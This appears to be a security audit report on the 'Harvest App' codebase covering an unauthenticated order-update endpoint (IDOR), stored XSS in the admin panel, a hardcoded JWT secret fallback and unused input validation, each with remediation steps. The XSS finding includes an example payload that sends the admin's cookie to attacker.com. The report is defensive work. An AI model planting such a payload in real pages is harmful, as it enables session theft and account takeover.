# Security Audit Report

**Date:** 2026-01-08  
**Target:** Harvest App Codebase  
**Auditor:** Antigravity  

## Executive Summary

A security audit of the Harvest App codebase has revealed **Critical** vulnerabilities that could allow attackers to compromise user accounts, overwrite order data, and inject malicious scripts into the administrative interface. The most significant issues are an unauthenticated endpoint allowing modification of any order (IDOR) and Stored XSS vulnerabilities in the Admin order view.

## Findings Summary

| ID | Severity | Vulnerability | Description |
|----|----------|---------------|-------------|
| 1 | **CRITICAL** | IDOR / Broken Access Control | Public endpoint `POST /api/orders/update-details` allows modifying any order's shipping details and user email without authentication. |
| 2 | **HIGH** | Stored XSS | Admin panel renders user-supplied order details (Name, Address) without escaping, allowing arbitrary JavaScript execution in the context of the Admin. |
| 3 | **MEDIUM** | Weak Default Configuration | JWT Secret falls back to a hardcoded string if environment variable is missing. |
| 4 | **MEDIUM** | Missing Input Validation | Zod schemas are defined but not utilized in route handlers, relying on manual and incomplete validation. |
| 5 | **LOW** | Lack of Rate Limiting | No rate limiting on authentication or order creation endpoints. |

---

## Detailed Findings

### 1. Insecure Direct Object Reference (IDOR) - Order Modification

**Location:** `server/routes/order.routes.js` (Lines 202-233)  
**Endpoint:** `POST /api/orders/update-details`  

**Description:**
The endpoint accepts `orderId` and `email` in the request body and updates the order's shipping details and user email. Crucially, it **lacks any authentication or authorization middleware**. 

```javascript
router.post('/orders/update-details', (req, res) => {
    const { orderId, shipping, delivery_window, email } = req.body;
    // ...
    const stmt = db.prepare(`
        UPDATE orders 
        SET shipping_details = ?, 
            user_email = COALESCE(user_email, ?)
        WHERE id = ?
    `);
    const info = stmt.run(JSON.stringify(shippingData), email, orderId);
    // ...
});
```

**Risk:**
An attacker can iterate through sequential `orderId`s (integer) and:
- Overwrite existing shipping addresses.
- Change the `user_email` associated with an order to their own, potentially gaining access to others' order history via `GET /orders/mine`.
- Disrupt business operations.

**Remediation:**
- Implement `authenticateToken` middleware.
- Verify the authenticated user owns the order before allowing updates (or restricts to Admin only).

### 2. Stored Cross-Site Scripting (XSS)

**Location:** `public/admin/js/modules/orders/ui.js`  
**Vector:** `shipping_details.name`, `shipping_details.street`, etc.  

**Description:**
The Admin panel allows viewing orders. The application accepts raw JSON for `shipping_details` during order creation (`POST /api/orders`). The frontend rendering logic injects these values directly into the DOM using `innerHTML` without sanitization.

*Ref: `public/admin/js/modules/orders/ui.js`*
```javascript
// Line 198
<div class="text-sm font-semibold text-gray-900">${name}</div>

// Line 129
<div class="font-medium text-gray-900 mb-1">${street}</div>
```

**Risk:**
An attacker can place an order with a name like `<img src=x onerror="fetch('http://attacker.com/steal?cookie='+document.cookie)">`. When an Admin views the order list, the script executes, potentially stealing the Admin's JWT (if accessible) or performing actions on their behalf (e.g., creating other admin users).

**Remediation:**
- Use `textContent` instead of `innerHTML` when rendering user input.
- Validating and sanitizing input on the server side (using the unused Zod schemas).

### 3. Weak JWT Secret Configuration

**Location:** `server/middleware/auth.js`  

**Description:**
The application provides a default fallback for the JWT secret:
```javascript
const JWT_SECRET = process.env.JWT_SECRET || 'harvest-secret-key-change-in-prod';
```

**Risk:**
If the `.env` file is missing or the variable is not set locally/in production, the application uses a known secret. Passwords and sessions can be compromised.

**Remediation:**
- Remove the default fallback.
- Throw a hard error at startup if `JWT_SECRET` is missing.

### 4. Unused Input Validation

**Location:** `server/routes/*.js` vs `server/schemas.js`  

**Description:**
Comprehensive Zod schemas (`signupSchema`, etc.) exist in `server/schemas.js`, but they appear to be unused in the actual route handlers (`auth.routes.js`, `order.routes.js`). The code relies on basic manual checks (e.g., `if (!email || !password)`).

**Risk:**
Allows malformed data to enter the system, increasing the attack surface for injection attacks and application instability.

**Remediation:**
- Integrate Zod schema parsing into the route handlers.

---

## Recommendations

1.  **Immediate Fix:** Add `authenticateToken` to `POST /api/orders/update-details` and verify order ownership.
2.  **Immediate Fix:** Refactor `public/admin/js/modules/orders/ui.js` to escape variables before inserting into HTML string templates, or use `textContent` where possible.
3.  **Process:** Ensure `JWT_SECRET` is enforced in the environment.
4.  **Process:** Adopt Zod for strict input validation on all API endpoints.
